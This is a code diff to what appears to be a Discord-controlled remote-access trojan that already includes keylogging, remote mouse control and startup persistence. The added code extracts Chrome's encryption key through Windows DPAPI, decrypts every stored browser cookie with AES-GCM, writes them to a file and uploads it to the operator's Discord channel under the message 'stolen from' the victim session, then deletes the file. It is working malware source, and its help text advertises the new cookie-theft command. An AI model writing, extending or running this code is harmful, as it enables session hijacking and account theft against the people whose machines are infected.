@@ -14,6 +14,10 @@ import pyperclip
 from subprocess import call
 import sys
 import shutil
+import sqlite3
+import json
+import win32crypt
+from Cryptodome.Cipher import AES
 
 while True:
     try:
@@ -82,6 +86,26 @@ while True:
                                 if event.name == 'backspace':
                                     event.name = '[Backspace]'
                         log += event.name
+        
+        def cookieSteal():
+            conn = sqlite3.connect(f'{os.path.expanduser("~")}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies')
+            cursor = conn.cursor()
+            logs_file = open("c.txt", "w")
+            with open(os.getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Local State", 'r', encoding="utf-8") as file:
+                encrypted_key = json.loads(file.read())['os_crypt']['encrypted_key']
+                encrypted_key = base64.b64decode(encrypted_key)
+                encrypted_key = encrypted_key[5:]
+                decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            cursor.execute('SELECT host_key, name, value, encrypted_value from cookies')
+            for host_key, name, value, encrypted_value in cursor.fetchall():
+                try:
+                    cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=encrypted_value[3:3+12])
+                    decrypted_value = cipher.decrypt_and_verify(encrypted_value[3+12:-16], encrypted_value[-16:])
+                except:
+                    decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8') or value or "0"
+                cookie =  "Host Key:", host_key + " " + "Name:", name + " " + "Value:", decrypted_value.decode('utf-8') + " \n"
+                logs_file.writelines(cookie)
+            conn.close()
 
         @bot.event
         async def on_ready():
@@ -257,6 +281,20 @@ while True:
             else:
                 if session == sesja:
                     pyautogui.click(x=int(x), y=int(y))
+        
+        @bot.command()
+        async def chrome(ctx, session, action):
+            if session == "all":
+                if action == "cookie":
+                    cookieSteal()
+                    await ctx.send(f"stolen from {sesja}", file=discord.File("c.txt"))
+                    os.system("del c.txt")
+            else:
+                if session == sesja:
+                    if action == "cookie":
+                        cookieSteal()
+                        await ctx.send(f"stolen from {sesja}", file=discord.File("c.txt"))
+                        os.system("del c.txt")
 
         @bot.command()
         async def press(ctx, session, klawisz = "Enter"):
@@ -349,6 +387,7 @@ while True:
 !sessions - Displays all sessions.
 !rename [session] [new_name] - Changes the name of a session.
 !startup [session] [file path] - copy file to startup folder (you can copy pinkcord exe file)
+!chrome [session] [action(cookie)] - steals selected data from chrome
             '''
             await ctx.send(wiadomosc)
 
